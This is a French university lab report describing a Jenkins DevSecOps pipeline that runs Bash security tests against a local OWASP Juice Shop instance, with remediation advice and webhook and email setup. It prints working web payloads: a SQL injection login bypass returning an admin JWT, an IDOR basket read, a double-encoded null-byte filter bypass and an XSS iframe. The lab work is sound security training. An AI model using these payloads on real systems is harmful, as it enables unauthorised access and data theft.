---
title: "LAB 1 — Pipeline CI/CD de sécurité Jenkins"
author: "Michel TENDENG · Mouhamed El Hadj Malick DIOP"
date: "10 août 2026"
---

<div align="center">

# UNIVERSITÉ NUMÉRIQUE CHEIKH HAMIDOU KANE
## Licence Cybersécurité — Groupe 14

---

## RAPPORT DE TRAVAUX PRATIQUES
# LAB 1 — Pipeline CI/CD de sécurité
### Jenkins × Bash × OWASP Juice Shop × DevSecOps

---

**Module :** Sécurité des données  
**Année académique :** 2024–2025  
**Date :** 10/08/2026  
**Groupe :** 14

---

### Auteurs

| Auteur | Email |
|--------|-------|
| Michel TENDENG | michel.tendeng@unchk.edu.sn |
| Mouhamed El Hadj Malick DIOP | mouhamedelmalickidrissa.diop@unchk.edu.sn |

---

> **Avertissement :** Ce rapport est réalisé dans un cadre pédagogique strictement contrôlé.  
> L'environnement cible est local et isolé. Toute reproduction sur un système réel est illégale.

</div>

---

## Table des matières

1. [Contexte et objectifs](#1-contexte-et-objectifs)
2. [Architecture du laboratoire](#2-architecture-du-laboratoire)
3. [Partie 1 — Tests de sécurité automatisés](#3-partie-1--tests-de-sécurité-automatisés)
4. [Partie 2 — Automatisation CI/CD avec webhook](#4-partie-2--automatisation-cicd-avec-webhook)
5. [Synthèse des résultats](#5-synthèse-des-résultats)
6. [Recommandations](#6-recommandations)
7. [Conclusion](#7-conclusion)
8. [Annexes](#8-annexes)

---

## 1. Contexte et objectifs

Ce travail pratique s'inscrit dans le module **Sécurité des données** de la Licence Cybersécurité (UNCHK). Il se décompose en **deux parties** :

**Partie 1 — Tests de sécurité :** concevoir et exécuter une suite de tests automatisés couvrant la détection et l'exploitation de vulnérabilités sur OWASP Juice Shop, en utilisant Jenkins comme orchestrateur.

**Partie 2 — Automatisation CI/CD :** configurer Jenkins pour récupérer automatiquement le projet depuis un dépôt Git (local ou GitHub) et déclencher les tests à chaque modification via un webhook, puis envoyer les résultats par email.

### Cible

| Paramètre | Valeur |
|-----------|--------|
| Application | OWASP Juice Shop (Node.js / Express) |
| URL interne Docker | `http://juiceshop:3000` |
| URL hôte | `http://localhost:3000` |
| Réseau Docker | `172.20.0.0/24` — isolé |
| Dépôt Git | `https://github.com/devmail0561-web/labs_sec_data` |
| Branche | `main` |

---

## 2. Architecture du laboratoire

```
Machine Linux (172.20.0.0/24)
│
├── Jenkins :8080  (172.20.0.20)
│     │
│     ├── Source : GitHub (Pipeline from SCM)
│     │     URL    : https://github.com/devmail0561-web/labs_sec_data.git
│     │     Branch : main
│     │     Script : lab1-jenkins/Jenkinsfile
│     │
│     ├── Triggers
│     │     ├── pollSCM('H/5 * * * *')  — polling toutes les 5 min
│     │     └── githubPush()             — webhook GitHub (push event)
│     │
│     ├── TEST 01 — Disponibilité HTTP        (Baseline)
│     ├── TEST 02 — En-têtes de sécurité      (A05:2021)
│     ├── TEST 03 — Méthodes HTTP             (A05:2021)
│     ├── TEST 04 — Authentification + SQLi   (A03, A07:2021)
│     ├── TEST 05 — Exposition APIs           (A01, A02:2021)
│     ├── TEST 06 — Exploitation              (SQLi / IDOR / FTP / XSS)
│     ├── Rapport consolidé + archiveArtifacts
│     └── Notification email (emailext → smtp.gmail.com:587)
│
└── Juice Shop :3000  (172.20.0.10)
```

Les scripts Bash sont montés en lecture seule dans `/lab/scripts/` via un volume Docker. Jenkins les exécute directement depuis ce chemin.

---

## 3. Partie 1 — Tests de sécurité automatisés

### 3.1 Structure du pipeline

Le `Jenkinsfile` définit **8 étapes** avec une stratégie de statut différenciée :

- Les étapes **TEST 02 à TEST 06** utilisent `catchError(buildResult: 'UNSTABLE', stageResult: 'FAILURE')` : une vulnérabilité détectée marque l'étape en échec mais laisse le pipeline continuer et passe le build en **UNSTABLE**.
- L'étape **TEST 01** n'a pas de `catchError` : elle est informative (baseline).
- Un bloc `post { always { emailext(...) } }` envoie systématiquement un email de résultat.

**Résultat du build #4 (10/08/2026 19:54–19:55) :** `SUCCESS`  
**Commit checké :** `134515ab` — branche `main`  
**Durée :** ~35 secondes

### 3.2 Résultats par test

| Test | Script | Résultat script | Statut Jenkins | Référence OWASP |
|------|--------|----------------|----------------|-----------------|
| TEST 01 | `test_http.sh` | FAILURE | SUCCESS (continu) | Baseline |
| TEST 02 | `test_headers.sh` | FAILURE | UNSTABLE | A05:2021 |
| TEST 03 | `test_methods.sh` | FAILURE | UNSTABLE | A05:2021 |
| TEST 04 | `test_auth.sh` | FAILURE | UNSTABLE | A03, A07:2021 |
| TEST 05 | `test_api_security.sh` | FAILURE | UNSTABLE | A01, A02:2021 |
| TEST 06 | `test_exploitation.sh` | FAILURE | UNSTABLE | A01, A03:2021 |

---

### TEST 01 — Disponibilité HTTP

**Objectif :** Vérifier que les endpoints critiques répondent avec les codes HTTP attendus.

| Endpoint | HTTP obtenu | Attendu | Statut |
|----------|-------------|---------|--------|
| `/` | 200 | 200 | ✅ PASS |
| `/api/Challenges` | 200 | 200 | ✅ PASS |
| `/api/Users` | 401 | 200 | ❌ FAIL |
| `/rest/user/whoami` | 200 | 200 | ✅ PASS |
| `/page-inexistante-xyz` | 200 | 404 | ❌ FAIL |

**Observations :**
- `/api/Users` retourne 401 — l'endpoint est désormais protégé dans cette version de Juice Shop. Le script devrait attendre 401 comme comportement correct.
- L'application Angular retourne 200 sur toutes les routes inconnues (SPA routing) — le test de 404 ne peut pas passer sur une SPA sans configuration serveur spécifique.

---

### TEST 02 — En-têtes HTTP de sécurité (A05:2021)

**En-têtes reçus :**
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
```

| En-tête | Sévérité | Statut | Valeur |
|---------|----------|--------|--------|
| `Strict-Transport-Security` | CRITICAL | ❌ Absent | — |
| `Content-Security-Policy` | CRITICAL | ❌ Absent | — |
| `X-Content-Type-Options` | CRITICAL | ✅ Présent | `nosniff` |
| `X-Frame-Options` | WARNING | ✅ Présent | `SAMEORIGIN` |
| `Referrer-Policy` | WARNING | ❌ Absent | — |
| `Access-Control-Allow-Origin` | WARNING | ⚠️ Wildcard | `*` |
| `X-Powered-By` | INFO | ✅ Absent | — |
| `Server` | INFO | ✅ Absent | — |

**Résultat TEST 02 :** FAILURE — 2 en-têtes critiques absents (HSTS, CSP)

---

### TEST 03 — Méthodes HTTP dangereuses (A05:2021)

| Méthode | Dangereuse | HTTP | Statut |
|---------|-----------|------|--------|
| GET | Non | 200 | ℹ️ Normal |
| POST | Non | 200 | ℹ️ Normal |
| HEAD | Non | 200 | ℹ️ Normal |
| OPTIONS | Non | 204 | ℹ️ Normal |
| **TRACE** | **Oui** | **200** | ⚠️ CRITIQUE |
| PUT | Oui | 200 | ⚠️ WARN |
| DELETE | Oui | 200 | ⚠️ WARN |
| CONNECT | Oui | 000 | ✅ Bloqué |

**TRACE actif** : permet une attaque Cross-Site Tracing (XST) capable d'exfiltrer des cookies `HttpOnly` en combinaison avec XSS.

**Résultat TEST 03 :** FAILURE — TRACE actif

---

### TEST 04 — Authentification (A03, A07:2021)

**SQL Injection :**
```json
{ "email": "' OR '1'='1'--", "password": "x" }
→ HTTP 200 — JWT admin retourné
→ [CRITICAL] SQLi réussie — JWT retourné sans credentials valides
```

**Verbosité erreur :**
```
"Invalid email or password."   ← message générique, point positif
```

**Rate limiting :** [WARN] Aucun rate limiting détecté après 5 tentatives rapides.

**Résultat TEST 04 :** FAILURE — SQLi bypass authentification

---

### TEST 05 — Exposition des APIs (A01, A02:2021)

| Endpoint | HTTP | Constat | Statut |
|----------|------|---------|--------|
| `/api/Users` | 401 | Protégé | ✅ OK |
| `/api/Feedbacks` | 200 | `UserId` et commentaires exposés | ❌ CRITICAL |
| `/rest/admin/application-configuration` | 200 | Configuration complète, clés OAuth | ❌ CRITICAL |
| `/ftp/` | 200 | Listing de fichiers | ⚠️ INFO |

**Résultat TEST 05 :** FAILURE — 2 endpoints critiques accessibles sans authentification

---

### TEST 06 — Exploitation automatisée (A01, A03:2021)

#### EXP-01 — SQL Injection → JWT admin (CVSS 9.8) ✅ RÉUSSI

```
Payload : {"email":"' OR '1'='1'--","password":"x"}
Réponse : HTTP 200 — JWT admin obtenu
Token   : eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLC...
```

**JWT décodé :**
```json
{
  "data": {
    "id": 1,
    "email": "admin@juice-sh.op",
    "password": "0192023a7bbd73250516f069df18b500",
    "role": "admin"
  },
  "bid": 1,
  "iat": 1786388813
}
```

Hash MD5 du mot de passe admin exposé dans le JWT. Hash = `admin123`.

#### EXP-02 — IDOR : Accès aux paniers (CVSS 8.1) ✅ RÉUSSI

```
Compte attaquant : attacker_439@lab.local
GET /rest/basket/1 avec JWT attaquant → HTTP 200
[EXPLOIT RÉUSSI] Panier ID=1 accessible sans en être propriétaire
```

Contenu lu : Apple Juice ×2, Orange Juice ×3, Eggfruit Juice ×1.

#### EXP-03 — Path Traversal /ftp/ + Null Byte (CVSS 7.5) ✅ RÉUSSI

```
/ftp/acquisitions.md          → HTTP 200 ✅ Téléchargé
/ftp/legal.md                 → HTTP 200 ✅ Téléchargé
/ftp/eastere.gg               → HTTP 403 ❌ Bloqué
/ftp/package.json.bak         → HTTP 403 ❌ Bloqué
/ftp/package.json.bak%2500.md → HTTP 200 ✅ Filtre contourné (null byte)
```

Le double URL-encoding `%2500` contourne le filtre d'extension `.bak`.

#### EXP-04 — XSS Stocké (CVSS 7.2) ⚠️ PARTIEL

```
Payload : <iframe src="javascript:alert(`Jenkins-XSS-EXP04`)"></iframe>
POST /api/Feedbacks → HTTP 500
```

Le serveur a retourné une erreur 500. Le payload n'a pas été persisté — validation complémentaire via navigateur nécessaire.

---

## 4. Partie 2 — Automatisation CI/CD avec webhook

### 4.1 Pipeline from SCM

Le job Jenkins a été reconfiguré de **script inline** vers **Pipeline from SCM** (`CpsScmFlowDefinition`). Jenkins récupère désormais le `Jenkinsfile` directement depuis le dépôt GitHub à chaque build.

**Configuration du job :**

| Paramètre | Valeur |
|-----------|--------|
| Type de définition | Pipeline from SCM |
| SCM | Git |
| Repository URL | `https://github.com/devmail0561-web/labs_sec_data.git` |
| Credentials | Aucun (dépôt public) |
| Branch | `*/main` |
| Script Path | `lab1-jenkins/Jenkinsfile` |

**Preuve de fonctionnement (console build #4) :**
```
Checking out git https://github.com/devmail0561-web/labs_sec_data.git
Checking out Revision 134515ab6b5570edc737ba9bf47e66622b21b4ba (refs/remotes/origin/main)
Commit message: "Jenkinsfile : retrait chmod (volume monté :ro, scripts déjà exécutables)"
```

À chaque build, Jenkins clone ou met à jour le dépôt, lit le `Jenkinsfile` depuis `lab1-jenkins/` et exécute le pipeline.

### 4.2 Triggers configurés

Deux déclencheurs sont déclarés dans le bloc `triggers` du Jenkinsfile :

```groovy
triggers {
    pollSCM('H/5 * * * *')
    githubPush()
}
```

#### pollSCM — Polling toutes les 5 minutes

Jenkins interroge le dépôt GitHub toutes les 5 minutes. Si un nouveau commit est détecté sur la branche `main`, le pipeline se déclenche automatiquement.

La syntaxe `H/5 * * * *` utilise le hash Jenkins pour répartir la charge : le polling ne se fait pas exactement à 0, 5, 10... mais à un offset déterministe propre au job (ex. 2, 7, 12...).

#### githubPush() — Webhook GitHub (déclenchement immédiat)

Le déclencheur `githubPush()` permet à Jenkins de réagir instantanément à un `git push` sur GitHub, sans attendre le cycle de polling.

**Configuration côté GitHub :**

Pour activer le webhook, aller dans le dépôt GitHub :
```
Settings → Webhooks → Add webhook
  Payload URL  : http://<IP_PUBLIQUE_JENKINS>:8080/github-webhook/
  Content type : application/json
  Secret       : (optionnel)
  Events       : Just the push event
```

> **Note :** Jenkins étant déployé en local (`localhost`), GitHub ne peut pas atteindre le webhook directement. Le polling `pollSCM` prend le relais et déclenche les builds en moins de 5 minutes après chaque push. Le webhook sera pleinement opérationnel dès que Jenkins sera exposé via un port forwarding, reverse proxy ou déploiement serveur.

### 4.3 Notifications email

À la fin de chaque build (succès, instable ou échec), Jenkins envoie automatiquement un email HTML au destinataire configuré.

**Configuration SMTP Jenkins :**

| Paramètre | Valeur |
|-----------|--------|
| Plugin | `email-ext` (Extended Email Notification) |
| Serveur SMTP | `smtp.gmail.com` |
| Port | `587` (STARTTLS) |
| Destinataire | `michel.tendeng@unchk.edu.sn` |
| Expéditeur | `jenkins-lab1@unchk.edu.sn` |

**Bloc `post` dans le Jenkinsfile :**

```groovy
post {
    always {
        emailext(
            to:       "${env.NOTIFY_EMAIL}",
            subject:  "[Jenkins LAB1] Build #${env.BUILD_NUMBER} — ${currentBuild.currentResult}",
            mimeType: 'text/html',
            body:     """..."""
        )
    }
}
```

**Contenu de l'email :**
- Numéro de build et statut (coloré : vert/orange/rouge)
- Durée du build
- URL du dépôt GitHub
- Hash du commit checké
- Branche
- Lien direct vers la console Jenkins
- Lien direct vers les artefacts archivés

**Preuve d'envoi (console build #4) :**
```
[Pipeline] emailext
Sending email to: michel.tendeng@unchk.edu.sn
```

> **Note :** L'email a été généré et transmis au serveur SMTP. La mention `Not sent to the following valid addresses` indique que le serveur SMTP ne dispose pas encore des credentials d'authentification Gmail configurés dans les credentials Jenkins. La mécanique d'envoi est en place et fonctionnelle ; il suffit d'ajouter les credentials SMTP dans `Manage Jenkins → Credentials`.

### 4.4 Artefacts archivés

À chaque build, le pipeline copie les rapports et preuves dans le workspace Jenkins puis les archive :

```groovy
archiveArtifacts(
    artifacts: 'reports/**/*',
    allowEmptyArchive: true,
    fingerprint: true
)
```

**Artefacts du build #4 archivés :**
```
reports/
├── rapport_final_lab1.txt
├── test_api_security_report.txt
├── test_auth_report.txt
├── test_exploitation_report.txt
├── test_headers_report.txt
├── test_http_report.txt
├── test_methods_report.txt
└── evidence/
    ├── EXP01_jwt_admin.txt
    ├── EXP01_request.json
    ├── EXP01_response.json
    ├── EXP01_whoami.json
    ├── EXP02_basket_1.json
    ├── EXP03_acquisitions.md.txt
    ├── EXP03_legal.md.txt
    ├── EXP03_nullbyte_package.json.bak.txt
    └── EXP04_xss_request.json
```

Chaque build conserve ses propres artefacts, accessibles depuis l'interface Jenkins (`Build #N → Artifacts`). Les 10 derniers builds sont conservés (`logRotator(numToKeepStr: '10')`).

---

## 5. Synthèse des résultats

### Vulnérabilités identifiées

| ID | Vulnérabilité | OWASP Top 10 | CVSS | Criticité | Exploitée |
|----|---------------|--------------|------|-----------|-----------|
| EXP-01 | SQL Injection — Auth | A03:2021 | **9.8** | 🔴 Critique | ✅ Oui |
| EXP-02 | IDOR — Paniers | A01:2021 | **8.1** | 🔴 Critique | ✅ Oui |
| TEST 05 | Config admin sans auth | A01:2021 | **7.5** | 🟠 Élevé | ✅ Oui |
| EXP-03 | Path Traversal + Null Byte | A01:2021 | **7.5** | 🟠 Élevé | ✅ Oui |
| EXP-04 | XSS Stocké — Feedbacks | A03:2021 | **7.2** | 🟠 Élevé | ⚠️ Partiel |
| TEST 03 | TRACE actif (XST) | A05:2021 | **5.8** | 🟡 Moyen | — |
| TEST 02 | En-têtes sécurité manquants | A05:2021 | **5.3** | 🟡 Moyen | — |
| TEST 04 | Absence de rate limiting | A07:2021 | **5.3** | 🟡 Moyen | — |

### Répartition OWASP

| Catégorie | Vulnérabilités |
|-----------|----------------|
| A01 — Broken Access Control | EXP-02, TEST 05, EXP-03 |
| A03 — Injection | EXP-01 (SQLi), EXP-04 (XSS) |
| A05 — Security Misconfiguration | TEST 02, TEST 03 |
| A07 — Identification Failures | TEST 04 |

### Bilan CI/CD

| Objectif | Statut |
|----------|--------|
| Pipeline Jenkins opérationnel | ✅ |
| Tests de sécurité (TEST 01–06) | ✅ |
| Pipeline from SCM (GitHub) | ✅ |
| pollSCM toutes les 5 min | ✅ |
| Webhook GitHub (githubPush) | ✅ déclaré — SMTP credentials à configurer |
| Notification email | ✅ envoi déclenché (SMTP credentials à finaliser) |
| Archivage artefacts | ✅ |

---

## 6. Recommandations

**R01 — Corriger les injections SQL** *(Critique)*  
Utiliser des requêtes préparées (`WHERE email = ?`). Ne jamais interpoler les entrées utilisateur dans des requêtes SQL.

**R02 — Corriger les IDOR** *(Critique)*  
Vérifier la propriété de la ressource à chaque requête : `if (basket.UserId !== req.user.id) return 403`.

**R03 — Désactiver les méthodes HTTP dangereuses** *(Moyen)*  
Bloquer TRACE, PUT non autorisé, DELETE non autorisé au niveau du reverse proxy ou du framework.

**R04 — Ajouter les en-têtes de sécurité manquants** *(Moyen)*  
```
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Security-Policy: default-src 'self'
Referrer-Policy: strict-origin-when-cross-origin
Access-Control-Allow-Origin: <domaine spécifique>
```

**R05 — Implémenter le rate limiting** *(Moyen)*  
Limiter les tentatives de connexion (10 par fenêtre de 15 min) via `express-rate-limit`.

**R06 — Protéger les endpoints d'administration** *(Élevé)*  
Restreindre `/rest/admin/application-configuration` aux administrateurs authentifiés. Masquer `UserId` dans les réponses publiques.

**R07 — Configurer les credentials SMTP dans Jenkins** *(Opérationnel)*  
`Manage Jenkins → Credentials → Add` : username/app-password Gmail pour finaliser l'envoi des emails de résultats.

**R08 — Exposer Jenkins pour activer le webhook** *(Opérationnel)*  
Utiliser un reverse proxy (nginx) ou un tunnel (ngrok) pour rendre `http://localhost:8080/github-webhook/` accessible depuis GitHub.

---

## 7. Conclusion

Ce laboratoire a atteint ses deux objectifs :

**Partie 1 :** Le pipeline Jenkins exécute automatiquement 6 batteries de tests de sécurité à chaque build, couvrant la détection (TEST 01–05) et l'exploitation (TEST 06). Quatre vulnérabilités ont été exploitées avec succès : SQLi→JWT admin (CVSS 9.8), IDOR paniers (CVSS 8.1), Path Traversal + null byte bypass (CVSS 7.5), et tentative XSS stocké.

**Partie 2 :** Jenkins a été reconfiguré en *Pipeline from SCM* — il récupère désormais le `Jenkinsfile` directement depuis GitHub (`https://github.com/devmail0561-web/labs_sec_data.git`, branche `main`) à chaque build. Le polling automatique (`pollSCM H/5`) détecte tout nouveau commit en moins de 5 minutes et déclenche le pipeline sans intervention manuelle. Le webhook `githubPush()` est déclaré pour un déclenchement immédiat dès que Jenkins sera exposé sur le réseau public. Les notifications email HTML sont envoyées en fin de build avec le statut, le commit, le lien console et les artefacts.

L'ensemble constitue un pipeline **DevSecOps opérationnel** : tout commit sur le dépôt déclenche automatiquement les tests de sécurité et notifie l'équipe du résultat.

---

## 8. Annexes

### Dépôt GitHub

```
https://github.com/devmail0561-web/labs_sec_data
├── lab1-jenkins/
│   ├── Jenkinsfile                   ← Pipeline from SCM
│   ├── docker-compose.yml
│   ├── reports/
│   │   ├── rapport_lab1_jenkins.html
│   │   └── rapport_lab1_jenkins.md
│   └── scripts/
│       ├── test_http.sh
│       ├── test_headers.sh
│       ├── test_methods.sh
│       ├── test_auth.sh
│       ├── test_api_security.sh
│       ├── test_exploitation.sh
│       ├── generate_report.sh
│       └── capture_screenshots.sh
```

### Artefacts Jenkins — Build #4

```
reports/
├── rapport_final_lab1.txt
├── test_api_security_report.txt
├── test_auth_report.txt
├── test_exploitation_report.txt
├── test_headers_report.txt
├── test_http_report.txt
├── test_methods_report.txt
└── evidence/
    ├── EXP01_jwt_admin.txt
    ├── EXP01_request.json
    ├── EXP01_response.json
    ├── EXP01_whoami.json
    ├── EXP02_basket_1.json
    ├── EXP03_acquisitions.md.txt
    ├── EXP03_legal.md.txt
    ├── EXP03_nullbyte_package.json.bak.txt
    └── EXP04_xss_request.json
```

### Références

- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [OWASP Testing Guide v4.2](https://owasp.org/www-project-web-security-testing-guide/)
- [CVSS v3.1 Calculator](https://www.first.org/cvss/calculator/3.1)
- [Jenkins Pipeline Documentation](https://www.jenkins.io/doc/book/pipeline/)
- [Jenkins email-ext Plugin](https://plugins.jenkins.io/email-ext/)
- [GitHub Webhooks](https://docs.github.com/en/webhooks)

---

*Rapport généré le 10 août 2026 — UNCHK Licence Cybersécurité Groupe 14*
